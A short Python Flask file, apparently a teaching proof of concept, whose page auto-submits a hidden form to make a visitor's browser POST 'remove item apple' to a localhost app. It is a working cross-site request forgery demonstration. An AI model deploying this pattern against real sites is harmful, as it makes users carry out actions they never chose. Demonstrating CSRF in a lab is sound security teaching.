from flask import Flask, render_template_string

app = Flask(__name__)


@app.route("/")
def index():
    return render_template_string(
        """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>CSRF</title>
        </head>
        <body>
            You just activated my trap card!
            <form hidden id="attack" action="http://localhost:5000/removeItem" method="POST" autocomplete="off">
                <input type="text" name="item" value="apple">
            </form>
            <script>
                document.getElementById("attack").submit();
            </script>
        </body>
        </html>
        """
    )
